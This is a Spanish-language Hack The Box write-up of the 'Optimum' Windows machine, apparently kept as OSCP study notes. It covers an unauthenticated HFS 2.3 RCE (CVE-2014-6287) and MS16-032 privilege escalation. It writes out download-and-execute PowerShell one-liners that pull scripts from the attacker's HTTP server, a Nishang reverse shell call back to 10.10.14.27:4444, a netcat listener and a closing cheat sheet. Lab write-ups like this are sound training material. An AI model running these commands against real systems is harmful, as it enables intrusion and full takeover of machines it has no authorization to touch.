[🟠 Optimum — HTB [Windows · Easy] 32715bd2d16c8025bbe5d16d2cc4523b.md](https://github.com/user-attachments/files/28263765/Optimum.HTB.Windows.Easy.32715bd2d16c8025bbe5d16d2cc4523b.md)
# 🟠 Optimum — HTB [Windows · Easy]

> **Plataforma:** Hack The Box | **OS:** Windows Server 2012 R2 x64 | **Dificultad:** Easy | **CVEs:** CVE-2014-6287 (HFS RCE) + MS16-032 (PrivEsc)
> 

| Campo | Detalle |
| --- | --- |
| IP | `10.129.6.34` |
| Foothold | RCE en HttpFileServer (HFS) 2.3 — CVE-2014-6287 |
| Acceso inicial | Shell como **kostas** (usuario bajo privilegio) |
| PrivEsc | MS16-032 (Secondary Logon Handle — Race Condition) |
| Acceso final | **NT AUTHORITYSYSTEM** |
| Método final | Invoke-MS16032 + redirección de flag a directorio legible |
| Shell interactiva SYSTEM | ❌ No obtenida (firewall bloqueó conexión) |

---

# 1. Reconocimiento

## Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 -oN optimum_full.nmap 10.129.6.34
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
```

Un solo puerto abierto. HFS 2.3 — HttpFileServer de Rejetto. Versión vulnerable a RCE sin autenticación.

```bash
searchsploit hfs 2.3
# → 49125.py — HttpFileServer 2.3 RCE (CVE-2014-6287)
```

---

# 2. Foothold — RCE en HFS 2.3 (CVE-2014-6287)

## ¿Qué es la vulnerabilidad?

**CVE-2014-6287** es un fallo en la función de búsqueda de HFS 2.3. El servidor no sanitiza correctamente el parámetro de búsqueda, permitiendo inyectar comandos a través de una secuencia de escape especial `%00`. El RCE ocurre sin necesidad de autenticación — cualquiera que pueda acceder al servidor web puede ejecutar comandos como el usuario que corre el proceso HFS.

## Por qué el exploit directo era inestable

El script `49125.py` ejecuta comandos directamente, pero la ejecución de comandos complejos o con espacios a través de este vector es inestable — los caracteres especiales se escapan mal, los comandos largos fallan silenciosamente y no hay feedback de errores. La solución es usar el exploit solo para lanzar **un único comando simple**: descargar y ejecutar un script PowerShell desde nuestro servidor.

## Preparación — [shell.ps](http://shell.ps)1

Descargar Invoke-PowerShellTcp de Nishang:

```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O shell.ps1
```

**Añadir al final del archivo `shell.ps1`** esta línea (fuera de cualquier función):

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 4444
```

> **Por qué añadirla al final del archivo:** Cuando PowerShell hace `IEX` (Invoke-Expression) sobre el script, lo carga en memoria pero no ejecuta las funciones definidas — solo ejecuta el código que está fuera de las funciones. Al añadir la llamada al final del archivo, la función se define primero y luego se ejecuta automáticamente sin necesidad de llamarla manualmente. Esto evita el error `CommandNotFound` que ocurre cuando intentas llamar la función en una sesión separada.
> 

## Infraestructura

```bash
# Servidor HTTP para servir shell.ps1
sudo python3 -m http.server 80

# Listener
nc -lvnp 4444
```

## Ejecutar el exploit

```bash
python3 49125.py 10.129.6.34 80 "cmd.exe /c powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.27/shell.ps1')"
```

**Por qué este one-liner funciona:**

- `IEX` (Invoke-Expression) descarga el script como string y lo ejecuta directamente en memoria — sin tocar el disco, sin restricciones de ejecución de scripts.
- `New-Object Net.WebClient` crea un cliente HTTP nativo de .NET, sin depender de herramientas externas.
- Todo el payload es un único comando simple que el exploit puede manejar sin problemas de escapado.

## Shell recibida

```
Windows PowerShell running as user kostas on OPTIMUM
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop> whoami
optimum\kostas

PS C:\Users\kostas\Desktop> type user.txt
[USER FLAG]
```

---

# 3. Enumeración Post-Foothold — Identificar vector de PrivEsc

## Systeminfo + Sherlock

Transferir [Sherlock.ps](http://Sherlock.ps)1 para identificar vulnerabilidades de kernel:

```bash
# En Kali — descargar Sherlock
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
# Añadir al final: Find-AllVulns
sudo python3 -m http.server 80
```

```powershell
# En la shell de kostas
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.27/Sherlock.ps1')
```

> La imagen a continuación muestra el output de Sherlock confirmando las vulnerabilidades disponibles:
> 

[Sherlock output confirmando vulnerabilidades](https://www.notion.so)

Sherlock output confirmando vulnerabilidades

**MS16-032 confirmado como vulnerable.**

## Arquitectura crítica — SysNative

```powershell
[System.Environment]::Is64BitProcess
# → False  ← la shell de PowerShell corre en 32 bits
[System.Environment]::Is64BitOperatingSystem
# → True   ← el OS es 64 bits
```

El proceso de la shell corre en modo WOW64 (32 bits emulado en 64 bits). MS16-032 necesita correr en un proceso de 64 bits real para explotar correctamente el kernel. Si se ejecuta desde el proceso de 32 bits, falla.

**Solución:** Usar `C:\Windows\SysNative\` que en procesos WOW64 apunta al directorio System32 real de 64 bits:

```powershell
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -Command "..."
```

---

# 4. Escalada de Privilegios — MS16-032

## ¿Qué es MS16-032?

**MS16-032** es una vulnerabilidad en el servicio **Secondary Logon** de Windows. El exploit abusa de una condición de carrera (race condition) en el manejo de handles de threads en `seclogon.dll`. Al crear múltiples threads simultáneos que compiten por el handle, es posible inyectar código en un proceso con privilegios de SYSTEM.

**Limitación crítica:** Requiere que el sistema tenga **más de un núcleo de CPU**. Si la máquina tiene un solo núcleo, la condición de carrera no puede ocurrir y el exploit falla con `No valid thread handles were captured`.

## Camino A — [Invoke-MS16032.ps](http://Invoke-MS16032.ps)1 (intentos fallidos)

```bash
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1
```

### Error 1 — TerminatorExpectedAtEndOfString

**Síntoma:**

```
TerminatorExpectedAtEndOfString
```

**Causa:** El script usa comillas anidadas para pasar el payload al exploit. PowerShell tiene reglas estrictas sobre el escapado de comillas — una comilla doble dentro de otra comilla doble rompe el parser. Al intentar construir el comando manualmente con la función, las comillas anidadas generan errores de sintaxis.

---

### Error 2 — No valid thread handles were captured

**Síntoma:**

```
No valid thread handles were captured, exiting!
```

**Causa:** MS16-032 es un exploit de race condition que requiere múltiples núcleos de CPU. La máquina Optimum tiene un solo núcleo, lo que hace que la competencia de threads no pueda ocurrir correctamente. El exploit detecta que no puede ganar la carrera y aborta.

**Solución:** Reiniciar la máquina en HTB y volver a intentar. Una máquina "sucia" por múltiples intentos fallidos del exploit puede hacer que los handles de threads queden en estados inconsistentes. Un reinicio limpia el estado del sistema.

---

### Error 3 — CommandNotFound al llamar la función

**Síntoma:**

```
Invoke-MS16032 : The term 'Invoke-MS16032' is not recognized
```

**Causa:** Al cargar el script con `IEX`, las funciones definidas en él quedan disponibles en la sesión actual pero se pierden al abrir una nueva PowerShell. Si el exploit lanza un proceso hijo de PowerShell para ejecutar el payload, ese proceso no tiene las funciones cargadas.

**Solución:** Añadir la llamada a la función directamente al final del script `.ps1` antes de servirlo, igual que con `shell.ps1`. Así cuando se hace `IEX` del script, la función se define y se ejecuta automáticamente en el mismo contexto.

---

## Camino B — Binario MS16-098 (41020.exe)

**Intento:** Buscar el binario precompilado `41020.exe` (exploit de Gisat/b33f).

**Problema:** Los repositorios de GitHub con el binario tenían enlaces rotos. `searchsploit` tiene el código fuente pero no el `.exe` compilado.

**Lección:** No depender de binarios precompilados de terceros. Si se necesita un `.exe`, compilarlo en Kali con mingw o buscarlo en `/usr/share/windows-resources/`.

---

## Camino C — Redirección de flag (SOLUCIÓN FINAL)

La shell reversa de SYSTEM no conectaba por red — el firewall de la máquina bloqueaba las conexiones salientes en el puerto configurado. MS16-032 confirmaba que la escalada funcionaba (`[+] Duplicated impersonation token ready!`) pero la shell interactiva llegaba a otra ventana en el limbo, no al listener.

**El insight clave:** Si el exploit confirma SYSTEM pero la shell no llega, **no se necesita la shell**. El objetivo es la flag, no la sesión interactiva. La solución fue usar el privilegio de SYSTEM para ejecutar un comando local que guardara la flag en un directorio donde kostas sí tiene permisos de lectura.

**Línea añadida al final de `Invoke-MS16032.ps1`:**

```powershell
Invoke-MS16032 -Command "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\kostas\Desktop\root_flag.txt"
```

```bash
# Servir el script modificado
sudo python3 -m http.server 80
```

```powershell
# En la shell de kostas — ejecutar desde SysNative para garantizar 64 bits
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.27/Invoke-MS16032.ps1')"
```

```powershell
# Leer la flag redirigida
type C:\Users\kostas\Desktop\root_flag.txt
[ROOT FLAG]
```

---

# 5. Historial de Errores — Lo Que Falló y Por Qué

| # | Problema | Error | Causa raíz |
| --- | --- | --- | --- |
| 1 | Ejecución directa de comandos complejos con exploit HFS | Comandos fallan silenciosamente | El RCE de HFS es inestable con comandos largos → usar IEX one-liner |
| 2 | Llamar función del script en sesión separada | `CommandNotFound` | Las funciones definidas con IEX no persisten en procesos hijos |
| 3 | Comillas anidadas en el comando de MS16-032 | `TerminatorExpectedAtEndOfString` | PowerShell tiene reglas estrictas de escapado de comillas anidadas |
| 4 | MS16-032 en máquina de 1 núcleo | `No valid thread handles` | Race condition requiere múltiples núcleos de CPU |
| 5 | Buscar binario 41020.exe externo | Links rotos | No depender de binarios de terceros — compilar o usar /usr/share/ |
| 6 | Shell reversa de SYSTEM bloqueada | No conecta al listener | Firewall bloqueó conexiones salientes → usar redirección local |
| ✅ | Invoke-MS16032 con redirección de flag | **Root flag obtenida** | Ejecutar desde SysNative (64 bits) + redirigir output a directorio legible |

---

# 6. Moralejas y Notas para el OSCP

## Moraleja 1 — IEX + DownloadString es el método estándar de transferencia en PowerShell

Cuando el RCE es inestable para comandos complejos, la solución es siempre la misma: usar el exploit solo para ejecutar un único comando simple que descargue y ejecute el payload real.

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://TU_IP/script.ps1')
```

Este patrón es el más fiable en entornos Windows para el OSCP — ejecuta el código en memoria sin tocar el disco, evita restricciones de ejecución de scripts y funciona incluso cuando `certutil` o `curl` están bloqueados.

---

## Moraleja 2 — Añadir la llamada al final del script, no llamarla manualmente

Cuando se carga un script con `IEX`, las funciones quedan disponibles solo en esa sesión. Si el exploit lanza un proceso hijo o una nueva PowerShell, las funciones no están disponibles. La solución es añadir la llamada a la función **al final del propio script** antes de servirlo:

```powershell
# Al final de shell.ps1:
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 4444

# Al final de Invoke-MS16032.ps1:
Invoke-MS16032 -Command "cmd /c ..."
```

Este patrón garantiza que la función se define y se ejecuta en el mismo contexto, eliminando el `CommandNotFound`.

---

## Moraleja 3 — 32 bits vs 64 bits: SysNative es la solución

En Windows, cuando un proceso de 32 bits (WOW64) intenta acceder a `C:\Windows\System32\`, Windows lo redirige silenciosamente a `C:\Windows\SysWOW64\`. Esto hace que exploits de kernel que necesitan el System32 real fallen sin error aparente.

La solución es usar `C:\Windows\SysNative\` que en procesos WOW64 apunta al System32 real de 64 bits:

```powershell
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -c "IEX(...)"
```

Verificar siempre la arquitectura del proceso tras el foothold:

```powershell
[System.Environment]::Is64BitProcess        # ¿Este proceso es 64 bits?
[System.Environment]::Is64BitOperatingSystem # ¿El OS es 64 bits?
```

---

## Moraleja 4 — Si el exploit confirma SYSTEM pero no hay shell, redirigir la flag

Esta es la lección más importante de Optimum para el OSCP. MS16-032 decía `[+] Duplicated impersonation token ready!` — confirmando que era SYSTEM — pero la shell reversa no llegaba porque el firewall bloqueaba las conexiones salientes.

La solución: **no necesitas una shell interactiva para conseguir la flag**. Usa el privilegio de SYSTEM para ejecutar un comando que deje la flag en un lugar donde sí puedas leerla:

```powershell
Invoke-MS16032 -Command "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\kostas\Desktop\root_flag.txt"
```

En el OSCP esto marca la diferencia entre puntuar la máquina y no puntuar. El objetivo es la flag, no la shell interactiva.

---

## Moraleja 5 — PowerShell ≠ CMD: conocer las diferencias evita errores tontos

En el OSCP tendrás shells de PowerShell y shells de CMD. Los comandos no son intercambiables:

| Acción | CMD | PowerShell |
| --- | --- | --- |
| Listar archivos recursivo | `dir /s` | `Get-ChildItem -Recurse` |
| Tipo de archivo | `type archivo.txt` | `Get-Content archivo.txt` |
| Ver variable de entorno | `echo %PATH%` | `$env:PATH` |
| Ejecutar script | `script.bat` | `.\script.ps1` |

Usar comandos de CMD en PowerShell o viceversa genera errores de sintaxis que confunden y consumen tiempo.

---

## Moraleja 6 — Race conditions: reiniciar si el exploit "debería funcionar" y no lo hace

MS16-032 es un exploit de condición de carrera. Si el sistema está "sucio" por intentos fallidos anteriores (handles de threads en estado inconsistente), el exploit puede fallar aunque el sistema sea vulnerable. En el OSCP, si un exploit de kernel falla en una máquina que debería ser vulnerable, reiniciar la instancia y volver a intentarlo desde cero antes de descartar el vector.

---

## Moraleja 7 — El patrón completo de Optimum

```
nmap → HFS 2.3 → CVE-2014-6287
    ↓
IEX one-liner → shell.ps1 con Invoke-PowerShellTcp al final
    ↓
Shell como kostas → user flag
    ↓
IEX Sherlock.ps1 → MS16-032 vulnerable
    ↓
Verificar arquitectura → SysNative para 64 bits
    ↓
MS16-032 con firewall bloqueando shell reversa
    ↓
Redirección de flag: type root.txt > directorio legible
    ↓
Root flag ✅
```

---

# 7. Comandos Clave — Cheat Sheet

```bash
# Preparar shell.ps1 (añadir al final)
echo "Invoke-PowerShellTcp -Reverse -IPAddress TU_IP -Port 4444" >> shell.ps1

# Servidor HTTP
sudo python3 -m http.server 80

# Listener
nc -lvnp 4444

# Exploit HFS
python3 49125.py 10.129.6.34 80 "cmd.exe /c powershell IEX(New-Object Net.WebClient).DownloadString('http://TU_IP/shell.ps1')"

# En shell de kostas — verificar arquitectura
[System.Environment]::Is64BitProcess

# Sherlock para enumerar PrivEsc
IEX(New-Object Net.WebClient).DownloadString('http://TU_IP/Sherlock.ps1')

# MS16-032 desde SysNative (64 bits) con redirección de flag
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://TU_IP/Invoke-MS16032.ps1')"

# Leer flag redirigida
type C:\Users\kostas\Desktop\root_flag.txt
```
